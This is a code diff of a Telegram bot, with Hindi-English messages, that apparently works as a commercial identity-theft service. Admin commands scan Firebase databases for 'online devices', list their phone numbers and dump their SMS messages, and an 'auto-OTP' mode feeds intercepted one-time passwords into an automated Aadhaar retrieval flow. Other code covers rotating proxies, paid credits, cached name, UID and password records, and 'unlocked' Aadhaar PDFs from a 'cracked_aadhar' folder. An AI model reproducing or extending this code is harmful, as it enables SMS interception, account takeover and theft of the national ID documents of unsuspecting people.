+        bot.send_message(chat_id, "❌ Admin only command.")
+        return
+
+    links = aadhaar_engine._load_firebase_links()
+    if not links:
+        bot.send_message(chat_id, "📭 No Firebase links configured. Add one first with <code>/addfire URL</code>.", parse_mode='HTML')
+        return
+
+    parts = message.text.split(maxsplit=1)
+    target = parts[1].strip() if len(parts) > 1 and parts[1].strip().isdigit() else None
+
+    aadhaar_engine.auto_otp_state["enabled"] = True
+    aadhaar_engine.auto_otp_state["chat_id"] = chat_id
+    aadhaar_engine.auto_otp_state["target_mobile"] = target
+
+    msg = (
+        "🔥 <b>AUTO-OTP MODE ENABLED</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"📱 <b>Target Mobile:</b> <code>{target or 'any'}</code>\n"
+        f"🔗 <b>Links Monitored:</b> <code>{len(links)}</code>\n\n"
+        "✅ Ab jab bhi aap Aadhaar process start karenge, OTP automatically Firebase se fetch hoga!\n\n"
+        "🛑 Use <code>/stopauto</code> to disable."
+    )
+    bot.send_message(chat_id, msg, parse_mode='HTML')
+
+
+@bot.message_handler(commands=['stopauto'])
+def cmd_stopauto(message):
+    chat_id = message.chat.id
+    if chat_id not in ADMIN_IDS:
+        bot.send_message(chat_id, "❌ Admin only command.")
+        return
+
+    was = aadhaar_engine.auto_otp_state.get("enabled", False)
+    aadhaar_engine.auto_otp_state["enabled"] = False
+    aadhaar_engine.auto_otp_state["chat_id"] = None
+    aadhaar_engine.auto_otp_state["target_mobile"] = None
+
+    bot.send_message(
+        chat_id,
+        "🛑 <b>Auto-OTP mode disabled.</b>" if was else "ℹ️ Auto-OTP was already off.",
+        parse_mode='HTML'
+    )
+
+
+@bot.message_handler(commands=['resetused'])
+def cmd_resetused(message):
+    chat_id = message.chat.id
+    if chat_id not in ADMIN_IDS:
+        bot.send_message(chat_id, "❌ Admin only command.")
+        return
+
+    count = len(aadhaar_engine.auto_otp_state["used_otps"])
+    aadhaar_engine.auto_otp_state["used_otps"].clear()
+    bot.send_message(
+        chat_id,
+        f"🔄 <b>Reset complete.</b>\nCleared <code>{count}</code> cached OTP reference(s).",
+        parse_mode='HTML'
+    )
+
+
+# ==============================================================================
+# 🔬 DEBUG COMMANDS
+# ==============================================================================
+
+@bot.message_handler(commands=['debugscan'])
+def cmd_debugscan(message):
+    chat_id = message.chat.id
+    if chat_id not in ADMIN_IDS:
+        bot.send_message(chat_id, "❌ Admin only command.")
+        return
+
+    links = aadhaar_engine._load_firebase_links()
+    if not links:
+        bot.send_message(chat_id, "📭 No Firebase links configured.", parse_mode='HTML')
+        return
+
+    status = bot.send_message(chat_id, "🔬 <b>Deep-scanning Firebase...</b>", parse_mode='HTML')
+
+    async def run_debug():
+        async with aiohttp.ClientSession() as session:
+            chunks = []
+            for entry in links:
+                url = entry.get("url", "")
+                short = url.replace("https://", "").replace("http://", "").rstrip("/")
+                lines = [f"🔍 <b>Debug:</b> <code>{short}</code>"]
+                try:
+                    async with session.get(f"{url}clients.json?shallow=true",
+                                           timeout=aiohttp.ClientTimeout(total=8)) as r:
+                        if r.status != 200:
+                            lines.append(f"❌ clients.json HTTP {r.status}")
+                            chunks.append("\n".join(lines))
+                            continue
+                        shallow = await r.json() or {}
+                    lines.append(f"👥 Total clients: <b>{len(shallow)}</b>")
+
+                    async with session.get(f"{url}clients.json",
+                                           timeout=aiohttp.ClientTimeout(total=8)) as r:
+                        full = await r.json() or {}
+                    online = [c for c, d in full.items()
+                              if isinstance(d, dict) and d.get("status") is True]
+                    lines.append(f"🟢 Online devices: <b>{len(online)}</b>")
+
+                    with_phones = 0
+                    sample = []
+                    for cid in online[:10]:
+                        msgs = await aadhaar_engine.firebase_get_device_messages(session, url, cid, limit=5)
+                        phone = aadhaar_engine.firebase_extract_phone(msgs) if msgs else None
+                        if phone:
+                            with_phones += 1
+                            if len(sample) < 3:
+                                sample.append(f"  ├ <code>{phone}</code> → <code>{cid[:10]}…</code>")
+                    lines.append(f"📱 Devices with phones: <b>{with_phones}</b> (of first 10)")
+                    if sample:
+                        lines.append("\n".join(sample))
+                except Exception as e:
+                    lines.append(f"❌ Error: {e}")
+                chunks.append("\n".join(lines))
+            final = "\n\n━━━━━━━━━━━━━━━━━━━━━━\n\n".join(chunks)
+            try:
+                bot.edit_message_text(chat_id=chat_id, message_id=status.message_id, text=final, parse_mode='HTML')
+            except:
+                bot.send_message(chat_id, final, parse_mode='HTML')
+
+    try:
+        asyncio.run_coroutine_threadsafe(run_debug(), loop)
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ Debug error: {e}")
+
+
+@bot.message_handler(commands=['debugusers'])
+def cmd_debugusers(message):
+    chat_id = message.chat.id
+    if chat_id not in ADMIN_IDS:
+        bot.send_message(chat_id, "❌ Admin only command.")
+        return
+
+    links = aadhaar_engine._load_firebase_links()
+    if not links:
+        bot.send_message(chat_id, "📭 No Firebase links configured.", parse_mode='HTML')
+        return
+
+    status = bot.send_message(chat_id, "👥 <b>Fetching Firebase users...</b>", parse_mode='HTML')
+
+    async def run_debug_users():
+        async with aiohttp.ClientSession() as session:
+            lines = ["👥 <b>FIREBASE USER LIST</b>\n━━━━━━━━━━━━━━━━━━━━━━"]
+            total = 0
+            for entry in links:
+                url = entry.get("url", "")
+                short = url.replace("https://", "").replace("http://", "").rstrip("/")
+                mapping = await aadhaar_engine.firebase_find_phone_map(session, url, limit_devices=60)
+                total += len(mapping)
+                lines.append(f"\n🔗 <code>{short}</code> ({len(mapping)} phones)")
+                for phone in list(mapping.keys())[:20]:
+                    lines.append(f"  ├ <code>{phone}</code>")
+            lines.append(f"\n━━━━━━━━━━━━━━━━━━━━━━\n📊 <b>Total phones:</b> {total}")
+            final = "\n".join(lines)
+            try:
+                bot.edit_message_text(chat_id=chat_id, message_id=status.message_id, text=final, parse_mode='HTML')
+            except:
+                bot.send_message(chat_id, final, parse_mode='HTML')
+
+    try:
+        asyncio.run_coroutine_threadsafe(run_debug_users(), loop)
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ Debug error: {e}")
+
+
+@bot.message_handler(commands=['debugmsgs'])
+def cmd_debugmsgs(message):
+    chat_id = message.chat.id
+    if chat_id not in ADMIN_IDS:
+        bot.send_message(chat_id, "❌ Admin only command.")
+        return
+
+    parts = message.text.split(maxsplit=1)
+    target_phone = parts[1].strip() if len(parts) > 1 and parts[1].strip().isdigit() else None
+
+    links = aadhaar_engine._load_firebase_links()
+    if not links:
+        bot.send_message(chat_id, "📭 No Firebase links configured.", parse_mode='HTML')
+        return
+
+    status = bot.send_message(chat_id, f"📩 <b>Fetching messages{' for '+target_phone if target_phone else ''}...</b>", parse_mode='HTML')
+
+    async def run_debug_msgs():
+        async with aiohttp.ClientSession() as session:
+            lines = [f"📩 <b>MESSAGE DUMP</b>{' — '+target_phone if target_phone else ''}\n━━━━━━━━━━━━━━━━━━━━━━"]
+            for entry in links:
+                url = entry.get("url", "")
+                short = url.replace("https://", "").replace("http://", "").rstrip("/")
+                mapping = await aadhaar_engine.firebase_find_phone_map(session, url, limit_devices=40)
+                if not mapping:
+                    lines.append(f"\n🔗 <code>{short}</code> — no devices")
+                    continue
+                lines.append(f"\n🔗 <code>{short}</code>")
+                for phone, cid in list(mapping.items())[:5]:
+                    if target_phone and phone != target_phone:
+                        continue
+                    lines.append(f"\n  📱 <b>{phone}</b>")
+                    msgs = await aadhaar_engine.firebase_get_device_messages(session, url, cid, limit=5)
+                    if not msgs:
+                        lines.append("     (no messages)")
+                        continue
+                    for _, val in list(msgs.items())[-5:]:
+                        if isinstance(val, dict):
+                            body = val.get("body") or val.get("message") or str(val)
+                        else:
+                            body = str(val)
+                        body = body[:80].replace("\n", " ")
+                        lines.append(f"     <code>• {esc(body)}</code>")
+                if target_phone:
+                    break
+            lines.append("\n━━━━━━━━━━━━━━━━━━━━━━")
+            final = "\n".join(lines)
+            try:
+                bot.edit_message_text(chat_id=chat_id, message_id=status.message_id, text=final, parse_mode='HTML')
+            except:
+                bot.send_message(chat_id, final, parse_mode='HTML')
+
+    try:
+        asyncio.run_coroutine_threadsafe(run_debug_msgs(), loop)
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ Debug error: {e}")
+
+
+# ==============================================================================
+# 🌐 PROXY COMMANDS
+# ==============================================================================
+
+@bot.message_handler(commands=['reloadproxy'])
+def cmd_reloadproxy(message):
+    chat_id = message.chat.id
+    if chat_id not in ADMIN_IDS:
+        bot.send_message(chat_id, "❌ Admin only command.")
+        return
+
+    try:
+        import proxy_loader
+        proxies = proxy_loader.load_proxies(force=True)
+        bot.send_message(
+            chat_id,
+            f"🔄 <b>Proxy pool reloaded.</b>\n📊 Loaded: <code>{len(proxies)}</code> proxy(s)",
+            parse_mode='HTML'
+        )
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ Reload failed: {e}")
+
+
+@bot.message_handler(commands=['proxystatus'])
+def cmd_proxystatus(message):
+    chat_id = message.chat.id
+    if chat_id not in ADMIN_IDS:
+        bot.send_message(chat_id, "❌ Admin only command.")
+        return
+
+    try:
+        import proxy_loader
+        proxies = proxy_loader.load_proxies()
+        status_icon = "🟢 <b>Active</b>" if proxies else "🔴 <b>Empty</b>"
+        text = (
+            "🌐 <b>PROXY STATUS</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"📊 Pool size: <code>{len(proxies)}</code>\n"
+            f"📁 File: <code>proxies.txt</code>\n"
+            f"⚡ Status: {status_icon}\n"
+        )
+        if proxies:
+            for p in proxies[:5]:
+                masked = p.split("@")[-1] if "@" in p else p
+                text += f"  ├ <code>{masked}</code>\n"
+            if len(proxies) > 5:
+                text += f"  └ … +{len(proxies)-5} more\n"
+        text += "━━━━━━━━━━━━━━━━━━━━━━"
+        bot.send_message(chat_id, text, parse_mode='HTML')
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ Proxy status failed: {e}")
+
+
+@bot.message_handler(commands=['testproxy'])
+def cmd_testproxy(message):
+    chat_id = message.chat.id
+    if chat_id not in ADMIN_IDS:
+        bot.send_message(chat_id, "❌ Admin only command.")
+        return
+
+    status = bot.send_message(chat_id, "🌐 <b>Testing proxies...</b>", parse_mode='HTML')
+
+    async def run_test():
+        try:
+            import proxy_loader
+            proxies = proxy_loader.load_proxies(force=True)
+            if not proxies:
+                bot.edit_message_text(chat_id=chat_id, message_id=status.message_id,
+                                      text="❌ No proxies loaded.", parse_mode='HTML')
+                return
+
+            async with aiohttp.ClientSession() as session:
+                working = 0
+                tested = 0
+                lines = ["🌐 <b>PROXY TEST RESULTS</b>\n━━━━━━━━━━━━━━━━━━━━━━"]
+                for p in proxies[:5]:
+                    tested += 1
+                    masked = p.split("@")[-1] if "@" in p else p
+                    try:
+                        async with session.get(
+                            "https://api.ipify.org?format=json",
+                            proxy=p,
+                            timeout=aiohttp.ClientTimeout(total=10)
+                        ) as r:
+                            if r.status == 200:
+                                data = await r.json()
+                                ip = data.get("ip", "?")
+                                lines.append(f"✅ <code>{masked}</code> → <code>{ip}</code>")
+                                working += 1
+                            else:
+                                lines.append(f"❌ <code>{masked}</code> HTTP {r.status}")
+                    except Exception as e:
+                        err = str(e)[:40]
+                        lines.append(f"❌ <code>{masked}</code> — {esc(err)}")
+                lines.append("━━━━━━━━━━━━━━━━━━━━━━")
+                lines.append(f"📊 <b>Working:</b> {working}/{tested}")
+                final = "\n".join(lines)
+                try:
+                    bot.edit_message_text(chat_id=chat_id, message_id=status.message_id,
+                                          text=final, parse_mode='HTML')
+                except:
+                    bot.send_message(chat_id, final, parse_mode='HTML')
+        except Exception as e:
+            bot.send_message(chat_id, f"❌ Test error: {e}")
+
+    try:
+        asyncio.run_coroutine_threadsafe(run_test(), loop)
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ Test error: {e}")
+
+
+# ==============================================================================
+# ⚙️ STATUS & HELP
+# ==============================================================================
+
+@bot.message_handler(commands=['status'])
+def cmd_status(message):
+    chat_id = message.chat.id
+    if chat_id not in ADMIN_IDS:
+        bot.send_message(chat_id, "❌ Admin only command.")
+        return
+
+    links = aadhaar_engine._load_firebase_links()
+    auto_on = aadhaar_engine.auto_otp_state.get("enabled", False)
+
+    try:
+        import proxy_loader
+        proxies = proxy_loader.load_proxies()
+        proxy_count = len(proxies)
+    except Exception:
+        proxy_count = 0
+
+    active_now = len(aadhaar_engine.active_tasks)
+
+    status_text = (
+        "⚙️ <b>SYSTEM STATUS</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        "🔥 <b>Firebase:</b>\n"
+        f"  ├─ Links: <code>{len(links)}</code>\n"
+        f"  └─ Auto-OTP: {'🟢 ON' if auto_on else '🔴 OFF'}\n\n"
+        "🌐 <b>Proxies:</b>\n"
+        f"  └─ Pool: <code>{proxy_count}</code>\n\n"
+        "📊 <b>Live:</b>\n"
+        f"  ├─ Active tasks: <code>{active_now}</code>\n"
+        f"  ├─ Bot mode: <b>{stats_manager.get_bot_mode().upper()}</b>\n"
+        f"  ├─ Cooldown: <code>{stats_manager.get_cooldown_seconds()}s</code>\n"
+        f"  └─ Max concurrent: <code>{stats_manager.get_max_concurrent_tasks()}</code>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━"
+    )
+    bot.send_message(chat_id, status_text, parse_mode='HTML')
+
+
+@bot.message_handler(commands=['help'])
+def cmd_help(message):
+    chat_id = message.chat.id
+    if chat_id not in ADMIN_IDS:
+        bot.send_message(chat_id, "❌ Admin only command.")
+        return
+
+    help_text = (
+        "📖 <b>BOT COMMAND REFERENCE</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "🔥 <b>Firebase:</b>\n"
+        "  /addfire URL       — Add Firebase Realtime DB link\n"
+        "  /removefire URL    — Remove a specific link\n"
+        "  /removefire all    — Remove all links\n"
+        "  /listfire          — List all configured links\n\n"
+        "📱 <b>Auto-OTP:</b>\n"
+        "  /scan              — Scan Firebase for online devices\n"
+        "  /auto [N]          — Enable auto-OTP (optional target mobile N)\n"
+        "  /stopauto          — Disable auto-OTP\n"
+        "  /resetused         — Clear cached used-OTP registry\n\n"
+        "🔬 <b>Debug:</b>\n"
+        "  /debugscan         — Deep-scan Firebase endpoints\n"
+        "  /debugusers        — List all phones found on Firebase\n"
+        "  /debugmsgs [PHONE] — Dump latest SMS messages\n\n"
+        "🌐 <b>Proxy:</b>\n"
+        "  /reloadproxy       — Reload proxies.txt from disk\n"
+        "  /proxystatus       — Show proxy pool status\n"
+        "  /testproxy         — Test proxy connectivity\n\n"
+        "⚙️ <b>General:</b>\n"
+        "  /status            — System status overview\n"
+        "  /help              — This help menu\n"
+        "  /admin             — Open admin dashboard\n"
+        "━━━━━━━━━━━━━━━━━━━━━━"
+    )
+    bot.send_message(chat_id, help_text, parse_mode='HTML')
+
 
 @bot.message_handler(content_types=['text', 'photo', 'audio', 'video', 'document', 'sticker', 'voice', 'location', 'contact', 'video_note', 'animation'])
 def handle_all(message):
@@ -1168,10 +1701,10 @@ def handle_all(message):
     elif not check_user_joined(chat_id):
         prompt_join_channels(chat_id)
         return
-        
+
     state = user_states.get(chat_id, {})
     str_chat_id = str(chat_id)
-    
+
     # Broadcast Message Interceptor
     if state.get('step') == 'AWAITING_BROADCAST_MSG':
         text_val = message.text.strip() if message.text else ""
@@ -1180,10 +1713,10 @@ def handle_all(message):
             bot.send_message(chat_id, "❌ Broadcast cancelled.", reply_markup=types.ReplyKeyboardRemove())
             send_admin_dashboard(chat_id)
             return
-            
+
         user_states[chat_id] = {'step': 'IDLE'}
         bot.send_message(chat_id, "🚀 <b>Broadcast started in background...</b>\nUsers ko delivery messages report send ki jayegi.", parse_mode='HTML', reply_markup=types.ReplyKeyboardRemove())
-        
+
         # Start broadcasting in background thread
         threading.Thread(target=perform_broadcast, args=(message,), daemon=True).start()
         return
@@ -1192,7 +1725,7 @@ def handle_all(message):
     if not message.text:
         return
     text = message.text.strip()
-    
+
     # --- ADMIN CONFIGURATION & CREDIT SYSTEM INTERCEPTORS ---
     if state.get('step') == 'AWAITING_ADMIN_COOLDOWN':
         if text.lower() == 'cancel':
@@ -1200,11 +1733,11 @@ def handle_all(message):
             bot.send_message(chat_id, "❌ Action cancelled.", reply_markup=types.ReplyKeyboardRemove())
             send_admin_dashboard(chat_id)
             return
-            
+
         if not text.isdigit():
             bot.send_message(chat_id, "⚠️ Invalid number. Please send an integer value:")
             return
-            
+
         val = int(text)
         stats_manager.set_cooldown_seconds(val)
         user_states[chat_id] = {'step': 'IDLE'}
@@ -1218,11 +1751,11 @@ def handle_all(message):
             bot.send_message(chat_id, "❌ Action cancelled.", reply_markup=types.ReplyKeyboardRemove())
             send_admin_dashboard(chat_id)
             return
-            
+
         if not text.isdigit():
             bot.send_message(chat_id, "⚠️ Invalid number. Please send an integer value:")
             return
-            
+
         val = int(text)
         stats_manager.set_max_concurrent_tasks(val)
         user_states[chat_id] = {'step': 'IDLE'}
@@ -1236,11 +1769,11 @@ def handle_all(message):
             bot.send_message(chat_id, "❌ Action cancelled.", reply_markup=types.ReplyKeyboardRemove())
             send_admin_dashboard(chat_id)
             return
-            
+
         if not text.isdigit():
             bot.send_message(chat_id, "⚠️ Invalid number. Please send an integer value:")
             return
-            
+
         count = int(text)
         stats_manager.set_default_credits(count)
         user_states[chat_id] = {'step': 'IDLE'}
@@ -1254,11 +1787,11 @@ def handle_all(message):
             bot.send_message(chat_id, "❌ Action cancelled.", reply_markup=types.ReplyKeyboardRemove())
             send_admin_dashboard(chat_id)
             return
-            
+
         if not text.isdigit():
             bot.send_message(chat_id, "⚠️ Invalid User ID. Please send a valid numeric Telegram Chat ID:")
             return
-            
+
         target_id = int(text)
         user_states[chat_id] = {
             'step': 'AWAITING_ADMIN_GRANT_AMOUNT',
@@ -1275,20 +1808,20 @@ def handle_all(message):
             bot.send_message(chat_id, "❌ Action cancelled.", reply_markup=types.ReplyKeyboardRemove())
             send_admin_dashboard(chat_id)
             return
-            
+
         is_negative = text.startswith('-')
         clean_val = text[1:] if is_negative else text
         if not clean_val.isdigit():
             bot.send_message(chat_id, "⚠️ Invalid amount. Please send a numeric integer value:")
             return
-            
+
         amount = int(clean_val)
         if is_negative:
             amount = -amount
-            
+
         target_id = state.get('target_user_id')
         new_bal = stats_manager.add_user_credits(target_id, amount)
-        
+
         user_states[chat_id] = {'step': 'IDLE'}
         bot.send_message(chat_id, f"✅ Successfully updated credits for user <code>{target_id}</code>.\n💳 Added: <b>{amount}</b>\n💳 New Balance: <b>{new_bal}</b>", parse_mode='HTML', reply_markup=types.ReplyKeyboardRemove())
         send_admin_dashboard(chat_id)
@@ -1301,7 +1834,6 @@ def handle_all(message):
             aadhaar_engine.user_page_registry[str_chat_id]['value'] = '__CANCEL__'
         aadhaar_engine.buffered_inputs.pop(str_chat_id, None)
 
-            
         # 3. Terminate active Aadhaar engines and tasks
         if str_chat_id in aadhaar_engine.active_engines:
             eng = aadhaar_engine.active_engines.pop(str_chat_id, None)
@@ -1311,35 +1843,35 @@ def handle_all(message):
         if str_chat_id in aadhaar_engine.active_tasks:
             try: aadhaar_engine.active_tasks.remove(str_chat_id)
             except: pass
-            
+
         # 4. Reset User States to IDLE
         user_states[chat_id] = {'step': 'IDLE'}
-        
+
         cancel_text = (
             "❌ <b>Process Cancelled Successfully!</b>\n"
             "━━━━━━━━━━━━━━━━━━━━━━\n"
             "Aapka active session cancel kar diya gaya hai."
         )
         bot.send_message(chat_id, cancel_text, parse_mode='HTML')
-        
+
         send_welcome_dashboard(chat_id)
         return
-    
+
     # Priority Override: If input is a Target Mobile Number or start command with mobile number
     import re
-    
+
     is_group = chat_id < 0
     starts_with_cmd = text.lower().startswith(('/aadhaar', '/aadhar'))
-    
+
     extracted_target = None
-    
+
     if is_group:
         # In groups, we ONLY trigger if it starts with /aadhaar or /aadhar
         if starts_with_cmd:
             # Remove the command prefix
             cmd_len = len('/aadhaar') if text.lower().startswith('/aadhaar') else len('/aadhar')
             number_part = text[cmd_len:].strip()
-            
+
             # Clean and extract 10-digit number from number_part
             clean_num = re.sub(r'\D', '', number_part)
             if len(clean_num) == 10 and clean_num[0] in '6789':
@@ -1384,12 +1916,12 @@ def handle_all(message):
             # Deduct credit if bot mode is paid
             if stats_manager.get_bot_mode() == "paid":
                 stats_manager.deduct_user_credit(chat_id)
-                
+
             name = cached_record.get("name", "N/A")
             uid = cached_record.get("uid", "N/A")
             password = cached_record.get("password", "N/A")
             eid = cached_record.get("eid", "N/A")
-            
+
             cached_text = (
                 "🎉 <b>Record Found in Database! (Instant Retrieval)</b>\n\n"
                 f"👤 <b>Name:</b> <code>{name}</code>\n"
@@ -1400,7 +1932,7 @@ def handle_all(message):
                 "⚡ <i>Data locally retrieved instantly without contacting UIDAI servers.</i>"
             )
             bot.send_message(chat_id, cached_text, parse_mode='HTML')
-            
+
             # Try to send the unlocked PDF copy if it exists in the cracked directory
             try:
                 safe_name = "".join(c for c in name if c.isalnum() or c in (' ', '_', '-')).strip().replace(' ', '_')
@@ -1411,16 +1943,16 @@ def handle_all(message):
                         bot.send_document(chat_id, f, caption=f"📄 <b>Aadhaar PDF (Unlocked)</b>")
             except Exception as e_pdf:
                 print(f"⚠️ [CACHE] Failed to send cached PDF: {e_pdf}")
-                
+
             send_welcome_dashboard(chat_id)
             return
 
         print(f"🔄 Override: Preempting tasks for {chat_id} -> starting fresh target {extracted_target}")
-        
+
         # 1. Clear prompt/OTP registry lock and buffer
         aadhaar_engine.user_page_registry.pop(str_chat_id, None)
         aadhaar_engine.buffered_inputs.pop(str_chat_id, None)
-        
+
         # 2. Terminate old Aadhaar Engine processes if active
         if str_chat_id in aadhaar_engine.active_engines:
             eng = aadhaar_engine.active_engines.pop(str_chat_id, None)
@@ -1430,10 +1962,10 @@ def handle_all(message):
         if str_chat_id in aadhaar_engine.active_tasks:
             try: aadhaar_engine.active_tasks.remove(str_chat_id)
             except: pass
-            
+
         # Pre-warm Aadhaar portals early (both retrieve EID and download Aadhaar)
         aadhaar_engine.prewarm_engine(bot, chat_id, extracted_target)
-            
+
         # 3. Present prefix selection buttons immediately
         markup = types.InlineKeyboardMarkup(row_width=2)
         btn_male = types.InlineKeyboardButton("👨 Male", callback_data="mp|Mr.")
@@ -1441,7 +1973,7 @@ def handle_all(message):
         btn_manual = types.InlineKeyboardButton("✏️ Enter Name Manually", callback_data="mp|manual")
         markup.add(btn_male, btn_female)
         markup.add(btn_manual)
-        
+
         msg_text = get_ui_card(
             step_num="2",
             title="Gender / Prefix Selection",
@@ -1449,7 +1981,7 @@ def handle_all(message):
             target=extracted_target,
             show_tip=True
         )
-        
+
         bot.send_message(chat_id, msg_text, reply_markup=markup, parse_mode='HTML')
         user_states[chat_id] = {'step': 'AWAITING_MANUAL_PREF_SELECTION', 'num': extracted_target}
         return
@@ -1469,13 +2001,11 @@ def handle_all(message):
             except: pass
         return
 
-
-
     if state.get('step') == 'AWAITING_NAME':
         prefix = state.get('prefix', '')
         name = f"{prefix}{text}".strip()
         num = state.get('num', '')
-        
+
         status_msg = get_ui_card(
             step_num="3",
             title="EID Retrieval",
@@ -1487,17 +2017,18 @@ def handle_all(message):
             'username': message.from_user.username or 'N/A',
             'first_name': message.from_user.first_name or 'N/A'
         }
-        
+
         dob = None
         asyncio.run_coroutine_threadsafe(execute_and_reset(chat_id, name, num, dob, user_info=user_info), loop)
         return
+
 
 async def execute_and_reset(chat_id, name, num, dob, user_info=None):
     task_started = False
     try:
         # Check permissions/limits right before executing the task
         is_admin = chat_id in ADMIN_IDS
-        
+
         # Check credits one final time (if paid mode)
         if stats_manager.get_bot_mode() == "paid":
             credits = stats_manager.get_user_credits(chat_id)
@@ -1506,7 +2037,7 @@ async def execute_and_reset(chat_id, name, num, dob, user_info=None):
                 # Reset user state back to IDLE
                 user_states[chat_id] = {'step': 'IDLE'}
                 return
-                    
+
         # Check global cooldown for non-admins
         if not is_admin:
             allowed, remaining_seconds = stats_manager.check_global_cooldown()
@@ -1522,7 +2053,7 @@ async def execute_and_reset(chat_id, name, num, dob, user_info=None):
                 user_states[chat_id] = {'step': 'IDLE'}
                 send_welcome_dashboard(chat_id)
                 return
-                
+
         # If allowed and user is not admin, activate the global cooldown
         if not is_admin:
             stats_manager.update_global_run_time()
@@ -1546,7 +2077,7 @@ def cleanup_temp_files():
     """Sweeps and deletes any leftover temporary files or browser caches on startup to optimize storage."""
     print("🧹 [CLEANUP] Sweeping residual temporary files...")
     import shutil
-    
+
     # 1. Clean temp captcha files from project root
     prefixes = ['temp_captcha_', 'cap_ui_', 'cap_um_']
     for file in os.listdir(BASE_DIR):
@@ -1560,7 +2091,7 @@ def cleanup_temp_files():
     cracked_dir = os.path.join(BASE_DIR, 'cracked_aadhar')
     os.makedirs(cracked_dir, exist_ok=True)
     print(f"📁 [CLEANUP] Output folder ready: {cracked_dir}")
-            
+
     # 3. Clean temporary user data profile folders to save disk space
     bulk_dir = os.path.join(BASE_DIR, 'BULK_USER_DATA')
     if os.path.exists(bulk_dir):
@@ -1569,21 +2100,20 @@ def cleanup_temp_files():
             print("🧹 Cleaned bulk user data directories.")
         except: pass
 
+
 if __name__ == "__main__":
     # Clean leftover logs, captures, or profiles on startup
     cleanup_temp_files()
-    
+
     loop = asyncio.new_event_loop()
     def run_loop(l):
         asyncio.set_event_loop(l)
         l.run_until_complete(aadhaar_engine.init_pool(bot))
         l.run_forever()
-    
-    threading.Thread(target=run_loop, args=(loop,), daemon=True).start()
-    
-    print("🤖 Bot is now LIVE.")
-    
 
+    threading.Thread(target=run_loop, args=(loop,), daemon=True).start()
+
+    print("🤖 Bot is now LIVE.")
 
     # Infinite Polling Loop
     while True:
